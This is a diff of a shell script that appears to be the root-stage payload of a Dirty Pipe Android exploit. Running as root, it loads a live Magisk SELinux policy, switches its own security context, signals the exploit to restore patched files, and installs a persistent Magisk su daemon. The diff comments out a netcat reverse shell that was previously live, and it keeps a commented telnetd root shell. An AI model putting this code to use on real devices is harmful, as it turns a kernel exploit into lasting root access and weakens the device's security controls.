@@ -2,61 +2,122 @@
 # Called from modprobe-payload
 # Now in root user + permissive domain (u:r:vendor_modprobe:s0)
 
-#id > /data/local/tmp/mylog1
-#cat /proc/self/status >> /data/local/tmp/mylog1
+if [ -z "$1" ]; then
+    HOST=127.0.0.1
+    PORT=10847
 
-HOST=127.0.0.1
-PORT=10847
+    # BOOTCLASSPATH is required for magiskd
+    export ANDROID_DATA=/data
+    export ANDROID_ART_ROOT=/apex/com.android.art
+    export ANDROID_TZDATA_ROOT=/apex/com.android.tzdata
+    export SYSTEMSERVERCLASSPATH=/system/framework/com.android.location.provider.jar:/system/framework/services.jar:/system/framework/ethernet-service.jar:/apex/com.android.appsearch/javalib/service-appsearch.jar:/apex/com.android.media/javalib/service-media-s.jar:/apex/com.android.permission/javalib/service-permission.jar
+    export TERM=xterm-256color
+    export ANDROID_SOCKET_adbd=23
+    export ANDROID_STORAGE=/storage
+    export EXTERNAL_STORAGE=/sdcard
+    export DOWNLOAD_CACHE=/data/cache
+    export ANDROID_ASSETS=/system/app
+    export STANDALONE_SYSTEMSERVER_JARS=
+    export DEX2OATBOOTCLASSPATH=/apex/com.android.art/javalib/core-oj.jar:/apex/com.android.art/javalib/core-libart.jar:/apex/com.android.art/javalib/okhttp.jar:/apex/com.android.art/javalib/bouncycastle.jar:/apex/com.android.art/javalib/apache-xml.jar:/system/framework/framework.jar:/system/framework/framework-graphics.jar:/system/framework/ext.jar:/system/framework/telephony-common.jar:/system/framework/voip-common.jar:/system/framework/ims-common.jar:/apex/com.android.i18n/javalib/core-icu4j.jar
+    export BOOTCLASSPATH=/apex/com.android.art/javalib/core-oj.jar:/apex/com.android.art/javalib/core-libart.jar:/apex/com.android.art/javalib/okhttp.jar:/apex/com.android.art/javalib/bouncycastle.jar:/apex/com.android.art/javalib/apache-xml.jar:/system/framework/framework.jar:/system/framework/framework-graphics.jar:/system/framework/ext.jar:/system/framework/telephony-common.jar:/system/framework/voip-common.jar:/system/framework/ims-common.jar:/apex/com.android.i18n/javalib/core-icu4j.jar:/apex/com.android.appsearch/javalib/framework-appsearch.jar:/apex/com.android.conscrypt/javalib/conscrypt.jar:/apex/com.android.ipsec/javalib/android.net.ipsec.ike.jar:/apex/com.android.media/javalib/updatable-media.jar:/apex/com.android.mediaprovider/javalib/framework-mediaprovider.jar:/apex/com.android.os.statsd/javalib/framework-statsd.jar:/apex/com.android.permission/javalib/framework-permission.jar:/apex/com.android.permission/javalib/framework-permission-s.jar:/apex/com.android.scheduling/javalib/framework-scheduling.jar:/apex/com.android.sdkext/javalib/framework-sdkextensions.jar:/apex/com.android.tethering/javalib/framework-connectivity.jar:/apex/com.android.tethering/javalib/framework-tethering.jar:/apex/com.android.wifi/javalib/framework-wifi.jar
+    export SHELL=/bin/sh
+    export ANDROID_BOOTLOGO=1
+    export ASEC_MOUNTPOINT=/mnt/asec
+    export HOSTNAME=oriole
+    export TMPDIR=/data/local/tmp
+    export ANDROID_ROOT=/system
+    export ANDROID_I18N_ROOT=/apex/com.android.i18n
 
-export ANDROID_DATA=/data
-export ANDROID_ART_ROOT=/apex/com.android.art
-export HOME=/
-export ANDROID_TZDATA_ROOT=/apex/com.android.tzdata
-export SYSTEMSERVERCLASSPATH=/system/framework/com.android.location.provider.jar:/system/framework/services.jar:/system/framework/ethernet-service.jar:/apex/com.android.appsearch/javalib/service-appsearch.jar:/apex/com.android.media/javalib/service-media-s.jar:/apex/com.android.permission/javalib/service-permission.jar
-export TERM=xterm-256color
-export ANDROID_SOCKET_adbd=25
-export ANDROID_STORAGE=/storage
-export EXTERNAL_STORAGE=/sdcard
-export DOWNLOAD_CACHE=/data/cache
-export ANDROID_ASSETS=/system/app
-export DEX2OATBOOTCLASSPATH=/apex/com.android.art/javalib/core-oj.jar:/apex/com.android.art/javalib/core-libart.jar:/apex/com.android.art/javalib/okhttp.jar:/apex/com.android.art/javalib/bouncycastle.jar:/apex/com.android.art/javalib/apache-xml.jar:/system/framework/framework.jar:/system/framework/framework-graphics.jar:/system/framework/ext.jar:/system/framework/telephony-common.jar:/system/framework/voip-common.jar:/system/framework/ims-common.jar:/apex/com.android.i18n/javalib/core-icu4j.jar
-export BOOTCLASSPATH=/apex/com.android.art/javalib/core-oj.jar:/apex/com.android.art/javalib/core-libart.jar:/apex/com.android.art/javalib/okhttp.jar:/apex/com.android.art/javalib/bouncycastle.jar:/apex/com.android.art/javalib/apache-xml.jar:/system/framework/framework.jar:/system/framework/framework-graphics.jar:/system/framework/ext.jar:/system/framework/telephony-common.jar:/system/framework/voip-common.jar:/system/framework/ims-common.jar:/apex/com.android.i18n/javalib/core-icu4j.jar:/apex/com.android.appsearch/javalib/framework-appsearch.jar:/apex/com.android.conscrypt/javalib/conscrypt.jar:/apex/com.android.ipsec/javalib/android.net.ipsec.ike.jar:/apex/com.android.media/javalib/updatable-media.jar:/apex/com.android.mediaprovider/javalib/framework-mediaprovider.jar:/apex/com.android.os.statsd/javalib/framework-statsd.jar:/apex/com.android.permission/javalib/framework-permission.jar:/apex/com.android.permission/javalib/framework-permission-s.jar:/apex/com.android.scheduling/javalib/framework-scheduling.jar:/apex/com.android.sdkext/javalib/framework-sdkextensions.jar:/apex/com.android.tethering/javalib/framework-connectivity.jar:/apex/com.android.tethering/javalib/framework-tethering.jar:/apex/com.android.wifi/javalib/framework-wifi.jar
-export SHELL=/system/bin/sh
-export ANDROID_BOOTLOGO=1
-export ASEC_MOUNTPOINT=/mnt/asec
-export USER=root
-export TMPDIR=/data/local/tmp
-export PATH=/product/bin:/apex/com.android.runtime/bin:/apex/com.android.art/bin:/system_ext/bin:/system/bin:/system/xbin:/odm/bin:/vendor/bin:/vendor/xbin
-export ANDROID_ROOT=/system
-export ANDROID_I18N_ROOT=/apex/com.android.i18n
+    export USER=root
+    export PATH=/data/local/tmp/bin:/dev/.magisk:/product/bin:/apex/com.android.runtime/bin:/apex/com.android.art/bin:/system_ext/bin:/system/bin:/system/xbin:/odm/bin:/vendor/bin:/vendor/xbin
+    export HOME=/data/local/tmp
 
-#/data/local/tmp/magiskpolicy --save /data/local/tmp/policy-dump
-/data/local/tmp/magiskpolicy --magisk --live
+    #/data/local/tmp/magisk/magiskpolicy --save /data/local/tmp/policy-dump
+    /data/local/tmp/magisk/busybox ln -s /data/local/tmp/magisk/magiskinit /data/local/tmp/magisk/magiskpolicy
+    /data/local/tmp/magisk/magiskpolicy --magisk --live
 
-# Send completion signal to restore files
-killall -s SIGUSR1 dirtypipe-android
+    echo u:r:magisk:s0 > /proc/self/attr/current
 
-# INSECURE
-# /data/local/tmp/busybox telnetd -l /bin/sh -p 10847 &
+    # Send completion signal to restore files
+    /data/local/tmp/magisk/busybox killall -s SIGUSR1 dirtypipe-android
 
-# Reverse shell: A little safer
-sleep 1
-FIFO=/data/local/tmp/reverse-fifo
+    # INSECURE
+    # /data/local/tmp/magisk/busybox telnetd -l /bin/sh -p 10848 &
 
-rm -f $FIFO
-mkfifo $FIFO
-cat $FIFO | /system/bin/sh -i 2>&1|/data/local/tmp/busybox nc $HOST $PORT > $FIFO
+    # Reverse shell: A little safer
+    #sleep 1
+    #FIFO=/data/local/tmp/reverse-fifo
+    #
+    #rm -f $FIFO
+    #mkfifo $FIFO
+    #cat $FIFO | /system/bin/sh -i 2>&1|/data/local/tmp/magisk/busybox nc $HOST $PORT > $FIFO
 
-# Work in progress
+    # Experimental Magisk root access.
 
-#mkdir /dev/.magisk
-#cd /dev/.magisk || exit
-#
-#cp /data/local/tmp/magisk/* /dev/.magisk/
-#chmod 755 /dev/.magisk/*
-#chown root:root /dev/.magisk/*
-#
-#/dev/.magisk/magisk --daemon
+    # Avoid error: 'CANNOT LINK EXECUTABLE "/system/bin/app_process64": library "libnativeloader.so" not found: needed by main executable'
+    # startup-root is launched in bootstrap mount namespace. It prevent app_process from launch. Pull default ns from init to avoid it.
+    # I don't know why we are in bootstrap mount ns even though we forked from init.
+    /data/local/tmp/magisk/busybox nsenter -t 1 -m $0 magisk > /data/local/tmp/mylog2 2>&1 < /dev/null
 
-#/data/local/tmp/busybox sleep 3
+else
+    #set -e
 
+    /data/local/tmp/env-patcher || true
+
+    # Credit: https://github.com/j4nn/CVE-2020-0041/blob/v50g8-mroot/scripts/magisk-start.sh
+
+    killall -KILL magiskd || true
+
+    #./magiskpolicy --live --magisk "allow shell * * *"
+
+    # Stuck until screen is unlocked?
+    pm install -r /data/local/tmp/magisk/Magisk-v24.3.apk > /dev/null 2>&1 < /dev/null || true
+
+    M=/dev/.magisk
+
+    umount $M || true
+    mkdir $M 2> /dev/null || true
+    mount -t tmpfs none $M
+    cp /data/local/tmp/magisk/* $M || true
+
+    cd $M
+
+    chcon u:object_r:magisk_file:s0 /dev/.magisk
+    chcon u:object_r:magisk_file:s0 /dev/.magisk/*
+    chmod 755 /dev/.magisk /dev/.magisk/*
+
+    for i in su resetprop ; do ln -s $M/magisk $M/$i ; done
+
+    mkdir $M/.magisk
+    chmod 755 $M/.magisk
+    echo "KEEPVERITY=true" > $M/.magisk/config
+    echo "KEEPFORCEENCRYPT=true" >> $M/.magisk/config
+    chmod 000 $M/.magisk/config
+
+    mkdir -p /data/adb/magisk
+    chmod 700 /data/adb
+    chmod -R 755 /data/adb/magisk
+    chown -R root:root /data/adb/magisk
+
+    mkdir -p $M/.magisk/busybox ; chmod 755 $M/.magisk/busybox
+    mv busybox $M/.magisk/busybox
+    #$M/.magisk/busybox/busybox --install -s $M/.magisk/busybox
+
+    mkdir -p $M/.magisk/mirror ; chmod 000 $M/.magisk/mirror
+    mkdir -p $M/.magisk/block ; chmod 000 $M/.magisk/block
+    mkdir -p $M/.magisk/modules ; chmod 755 $M/.magisk/modules
+    #ln -s $M/.magisk/modules $M/.magisk/img
+    mkdir -p /data/adb/modules ; chmod 755 /data/adb/modules
+    mkdir -p /data/adb/post-fs-data.d ; chmod 755 /data/adb/post-fs-data.d
+    mkdir -p /data/adb/service.d ; chmod 755 /data/adb/service.d
+
+    #$M/magisk --restorecon
+    chcon -R -h u:object_r:rootfs:s0 $M/.magisk
+    chcon u:object_r:magisk_file:s0 $M/.magisk/busybox/busybox
+
+    $M/magisk --daemon
+
+    chmod 755 $M
+    #chcon u:object_r:system_file:s0 $M/magisk
+    #chcon u:object_r:system_file:s0 $M
+fi
